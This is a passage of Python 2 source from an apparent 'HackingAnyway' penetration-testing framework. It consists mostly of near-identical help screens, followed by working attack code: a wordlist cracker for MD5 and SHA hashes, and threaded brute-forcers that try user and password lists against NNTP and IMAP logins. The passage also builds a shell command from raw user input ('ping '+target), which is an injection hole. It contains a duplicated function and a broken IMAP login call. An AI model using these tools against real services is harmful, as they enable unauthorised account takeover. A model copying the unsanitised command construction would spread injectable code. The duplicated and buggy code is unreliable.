	print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
	print "\t\t#    www.Ashikali.com                           #" 
	print "\t\t#    GNU General Public License                 #"
	print "\t\t#################################################"
	
def hlpserver():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlplogin():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpphone():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpsqli():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpblind():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlplfi():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlprfi():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpxss():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpftp():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpsmtp():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpcpl():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpwrdp():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlptel():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpssh():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpssh():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpphpmy():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpdns():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpmysql():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlppop():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlphttp():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpdos():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpwordl():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpoth():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Other  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual Is The Help Desk Section For This Framework. This Modual Will Allow You For Creating The preparation Of The Penetration Testing"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Tool For Crating Word File And User File For Bruteforcing Attck. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpindex():

	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t Wellcome To Help Section Of HackingAnyway Framework"
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tPure penetration Testing System Devide In 5 Diffrent Parts Which All Are Perform By Propar Sequence. This Tool Will Perform The Pure Penetration Testing System. First You Should Gether Information Of The Target After You Shoud Use 2nd Task For Scan The Target And Last Phrase Of Penetration Testing System Is Attck Using The Information Which You Gethere Before All. The Section Of This Framework Have Help Included With Brief Discription"
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")		

def hlpbrute():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t  Wellcome To Help Section Of Target Brute Forcing "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tAll Brute Force Considered Application Proceeds Though All Posible Combinations Of Legal Characters in Sequence. Brute Force Considered Time Consuming Approch But This Method Is Not Involve Any User Intraction While Attck By Hacker"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Many Tools For Cracking The Passwords Using Predefined Words File Such As FTP, SMTP, TELNET, CPANEL ETC... Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
	
def hlpfoot():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t  Wellcome To Help Section Of Target Information Gethering"
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThe First Phrase Of Penetration Testing Is Gathering As Much As Possible Information Of The Target. Many People Are Avoid Informative Vulnerability But Malicious Attacker Can Exploit Critical Infrastructure Using Informative Vulnerability. This Phrase Allow To First Study The Target Completely."
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Few Tools Such As Web Server Identification, Adminpage Finder, IP Scanner, Phone No Finder Etc... Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples... Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpweb():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n     Wellcome To Help Section Of Evaluateing Web Appication Vulnerablity"
	print "\n****************************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Module Will Give The Information Of Web Application Vulnerability After Gathering Information Always Good Penetration Tester Will Scan The Target For Getting The Information.  This Tool Scans The Same Vulnerability Which Can Be Easily Exploited By The Malicious Hacker."
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Scanning SQL Injection, Remote File Inclusion, Local File Inclusion, Cross Site Scripting, Dork Scanning. This Module Is Purely Referred To Analyze The Web Application Vulnerability Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples... Working Flow Etc."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpptoxy():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Proxy Setting"
	print "\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\t\t\t----------------------------------"
	print "\n\tIf You Want To Penetrate The Target Via Proxy Or If You Are Using Internet Connection Via Proxy Then You Can Use This Part. Many Website And Network Use The IP Banning System This Time Hackers Are Use Socks For Hiding Their Activity. Even If The Target Blocks The One IP Then Hackers Can Change The Socks. In Penetration Testing This Module Can Be Very Helpful To Enumerate And Analysis Of IP Banning Function."
	print "\n\t\t\t\t  Tools Information"
	print "\t\t\t----------------------------------"
	print "\t\nThis Part COVERD Two Tools. First Will Search The Proxy From Internet & Second Tool Will Checking The Proxy For Whether Its Alive Or Dead. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def baser64p():
	#!/usr/bin/python
	import base64, sys
	global jamrukh, dadam
	
	if dadam==1:
		
		try:
			i = open(jamrukh, "r")
		except(IOError): 
			print "Check your File path."
			sys.exit(1)
		lines = i.readlines()
		for line in lines:
			try:
				x = base64.b64decode(line[:-1], '-_')
				print x
			except(TypeError): 
				print "\nIncorrect Padding or non-alphabet characters present in the string.\n"
	else:
		try:
			i = open(jamrukh, "r")
		except(IOError): 
			print "Check your File path."
			sys.exit(1)
		lines = i.readlines()
		for line in lines:
			print base64.b64encode(line[:-1])
	sending_back_to_vilage=raw_input("\n\tPress Any key For Going Back...")


def hshorb():
	
	import os, sys ,hashlib
	global algo
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	pw = raw_input("Enter Your Hash Here : ")
	wordlist = raw_input("\nEnter Your Word List File Here : ")
	try:
	  words = open(wordlist, "r")
	except(IOError): 
	  print "Error: Check your wordlist path\n"
	  sys.exit(1)
	words = words.readlines()
	print "\n",len(words),"words loaded..."
	file=open('cracked.txt','a')	
	if algo == 'md5':
		for word in words:
			hash = hashlib.md5(word[:-1])
			value = hash.hexdigest()
			if pw == value: 
				print "Password is:",word,"\n"
				file.write("\n Cracked Hashes\n\n")
				file.write(pw+"\t\t")
				file.write(word+"\n")
	if algo == 'sha1':
		for word in words:
			hash = hashlib.sha1(word[:-1])
			value = hash.hexdigest()
			if pw == value: 
				print "Password is:",word,"\n"
				file.write("\n Cracked Hashes\n\n")
				file.write(pw+"\t\t")
				file.write(word+"\n")
	if algo == 'sha256':
		for word in words:
			hash = hashlib.sha256(word[:-1])
			value = hash.hexdigest()
			if pw == value: 
				print "Password is:",word,"\n"
				file.write("\n Cracked Hashes\n\n")
				file.write(pw+"\t\t")
				file.write(word+"\n")

	if algo == 'sha384':
		for word in words:
			hash = hashlib.sha384(word[:-1])
			value = hash.hexdigest()
			if pw == value: 
				print "Password is:",word,"\n"
				file.write("\n Cracked Hashes\n\n")
				file.write(pw+"\t\t")
				file.write(word+"\n")
		
		
	if algo == 'sha512':
		for word in words:
			hash = hashlib.sha512(word[:-1])
			value = hash.hexdigest()
			if pw == value: 
				print "Password is:",word,"\n"
				file.write("\n Cracked Hashes\n\n")
				file.write(pw+"\t\t")
				file.write(word+"\n")
	sending_back_to_vilage=raw_input("\n\tPress Any key For Going Back...")
	
	

def nntplbr():

	#!usr/bin/python

	import threading, time, random, sys, nntplib, socket
	from nntplib import NNTP
	from copy import copy

	ta=raw_input("Enter The Target Here : ")
	por=input("Enter The port Here : ")
	uss=raw_input("Enter The User File Here : ")
	paa=raw_input("Enter The Password File Here : ")

	try:
	  	users = open(uss, "r").readlines()
	except(IOError): 
	  	print "Error: Check your userlist path\n"
	  	sys.exit(1)
  
	try:
	  	words = open(paa, "r").readlines()
	except(IOError): 
	  	print "Error: Check your wordlist path\n"
	  	sys.exit(1)


	print "[+] Server:",ta
	print "[+] Users Loaded:",len(users)
	print "[+] Words Loaded:",len(words),"\n"

	try:
		n = nntplib.NNTP(ta,int(por))
		print "[+] Response:",n.getwelcome(),"\n"
		n.quit()
	except(nntplib.NNTPError, socket.gaierror, socket.error, socket.herror):
		pass

	wordlist = copy(words)

	def reloader():
		for word in wordlist:
			words.append(word)

	def getword():
		lock = threading.Lock()
		lock.acquire()
		if len(words) != 0:
			value = random.sample(words,  1)
			words.remove(value[0])		
		else:
			print "\nReloading Wordlist - Changing User\n"
			reloader()
			value = random.sample(words,  1)
			users.remove(users[0])
		
		lock.release()
		if len(users) ==1:
			return value[0][:-1], users[0]
		else:
			return value[0][:-1], users[0][:-1]
		
	class Worker(threading.Thread):
	
		def run(self):
			value, user = getword()
			try:
				print "-"*12
				print "User:",user,"Password:",value
				n = nntplib.NNTP(ta,int(por),user,value)
				print "\t\nLogin successful:",value, user
				n.quit()
				work.join()
				sys.exit(2)
			except(nntplib.NNTPError, socket.gaierror, socket.error, socket.herror), msg: 
				print "An error occurred:", msg
				pass
 
	for i in range(len(words)*len(users)):
		work = Worker()
		work.start()
		time.sleep(1)
	sending_back_to_vilage=raw_input("\n\tPress Any key For Going Back...")


def imaperb():
	#!usr/bin/python

	import threading, time, random, sys, imaplib, socket
	from imaplib import IMAP4
	from copy import copy

	target=raw_input("Enter The target Here : ")
	wor = raw_input("Enter The user File Here : ")
	paso= raw_input("Enter The passWord File Here : ")

	try:
	  	users = open(wor, "r").readlines()
	except(IOError): 
	  	print "Error: Check your userlist path\n"
	  	sys.exit(1)
  
	try:
	  	words = open(paso, "r").readlines()
	except(IOError): 
	  	print "Error: Check your wordlist path\n"
	  	sys.exit(1)


	print "[+] Server:",target
	print "[+] Users Loaded:",len(users)
	print "[+] Words Loaded:",len(words),"\n"
	
	wordlist = copy(words)

	def reloader():
		for word in wordlist:
			words.append(word)

	def getword():
		lock = threading.Lock()
		lock.acquire()
		if len(words) != 0:
			value = random.sample(words,  1)
			words.remove(value[0])		
		else:
			print "\nReloading Wordlist - Changing User\n"
			reloader()
			value = random.sample(words,  1)
			users.remove(users[0])
			
		lock.release()
		if len(users) ==1:
			return value[0][:-1], users[0]
		else:
			return value[0][:-1], users[0][:-1]
		
	class Worker(threading.Thread):
		
		def run(self):
			value, user = getword()
			try:
				print "-"*12
				print "User:",user,"Password:",value
				M = imaplib.IMAP4(target)
				M = login(user, value)
				print "\t\nLogin successful:",user, value 
				M.close()
				M.logout()
				work.join()
				sys.exit(2)
			except(IMAP4.error, socket.gaierror, socket.error, socket.herror), msg: 
				print "An error occurred:", msg
				pass
 
	for i in range(len(words)*len(users)):
		work = Worker()
		work.start()
		time.sleep(1)
	sending_back_to_vilage=raw_input("\n\tPress Any key For Going Back...")


def pingubaba():

	#/usr/bin/python
	
	ip = 'o'
	log="reverselog.txt"
	cho = '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t############################################################"
		print "\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE             #" 
		print "\t#    Copyright (C) 2009 By Ashikali                        #"
		print "\t#    IP ADDRES SNIFER                                      #" 
		print "\t#    Ashikali1208[at]yahoo[dot]com                         #"                                
		print "\t#    www.Ashikali.com                                      #" 
		print "\t#    GNU General Public License                            #"
		print "\t############################################################"
		print "\n\tEnter 1 For Contineue "
		print "\n\tEnter 2 For Help Or Detail"
		print "\n\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\tEnter Which Operation You Want To Perform---> ")	
		if cho == '2':
			hlplogin()
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			target=raw_input("\n\n\tEnter The Target Here : ")
			print "\n\t[+] Target Loded ",target		
			cgiscan="ping "+target
